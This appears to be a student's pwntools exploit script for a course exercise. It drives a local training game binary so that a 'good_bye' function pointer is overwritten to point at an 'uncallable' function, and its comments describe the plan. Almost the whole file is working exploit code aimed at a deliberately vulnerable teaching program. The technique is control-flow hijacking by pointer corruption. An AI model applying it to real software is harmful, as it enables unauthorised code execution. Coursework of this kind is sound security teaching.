#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Issue:
- Need to execute uncallable() not directly accessible. What exploit techinque to use now? 

Ideas:
- The handout stats vulnerabilities related to function pointers --> good_bye(), uncallable()  
- The strategy is to manipulate the game's state such that the 'good_bye' function pointer is changed to point to the 'uncallable' function.

Workflow:
- The goodbye function at the end of the game sounds reasonable --> the strategy is to manipulate the game's state | the goodbye() function pointer is changed to point to uncallable()
- Retrieve initial memory addresses (goodbye and uncallable)
- Loop to manipulate the game's state:
	- Read the updated memory addresses (goodbye and uncalable)
	- If a change is detected in the goodbye address (somemory manipulation is working fine):
		- compare the current goodbye() address with the uncallable() address => 'd' or 'a' commands 
	- else go to nex fruit --> use 'A' as suggsted in the handout
- Continue this process until the goodbye() address matches the uncallable() address => 'q' to quit the game --> triggers uncallable() function since the goodbye pointer has been manipulated
'''

r= start()

r.recvuntil(b'good_bye')
address_goodbye = r.recvline().strip()
r.recvuntil(b'uncallable')
address_uncallable = r.recvline().strip()
r.recvuntil(b'enter:\n')
r.sendline(b'A')

address_changed = False
original_goodbye = address_goodbye

while address_goodbye != address_uncallable:
	r.recvuntil(b'good_bye')
	address_goodbye = r.recvline().strip()
	r.recvuntil(b'uncallable')
	address_uncallable = r.recvline().strip()
	r.recvuntil(b'enter:\n')
	if address_changed:
		goodbye_val = int.from_bytes(address_goodbye, 'little')
		uncallable_val = int.from_bytes(address_uncallable, 'little')
		if goodbye_val - uncallable_val < 0:
			move = b'd'
		else:
			move = b'a'
		r.sendline(move)
	else:
		r.sendline(b'A')

	if original_goodbye != address_goodbye:
		address_changed = True

r.sendline(b'q')
print(r.recvall())

